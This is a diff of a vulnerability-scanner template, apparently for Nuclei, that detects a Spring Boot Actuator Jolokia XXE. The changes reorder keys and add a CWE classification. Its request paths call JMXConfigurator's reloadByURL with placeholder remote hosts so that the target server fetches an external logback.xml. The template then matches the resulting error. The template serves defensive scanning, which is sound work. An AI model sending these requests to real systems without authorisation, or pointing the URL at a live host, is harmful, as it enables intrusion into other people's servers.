@@ -1,5 +1,4 @@
 id: springboot-actuators-jolokia-xxe
-
 info:
   name: Spring Boot Actuators (Jolokia) XXE
   author: dwisiswant0,ipanda
@@ -8,29 +7,27 @@ info:
   reference:
     - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
     - https://github.com/mpgn/Spring-Boot-Actuator-Exploit
+  classification:
+    cwe-id:
+      - CWE-611
   metadata:
     max-request: 2
-  tags: springboot,jolokia,xxe,vuln
-
+  tags: jolokia,springboot,vuln,xxe
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml"
-      - "{{BaseURL}}/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml"
-
-    stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
-          - "http:\\/\\/nonexistent:31337\\/logback.xml"
-          - "reloadByURL"
-          - "JoranException"
-        condition: and
-
-      - type: status
-        status:
+          - http:\/\/nonexistent:31337\/logback.xml
+          - reloadByURL
+          - JoranException
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml'
+      - '{{BaseURL}}/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml'
+    stop-at-first-match: true
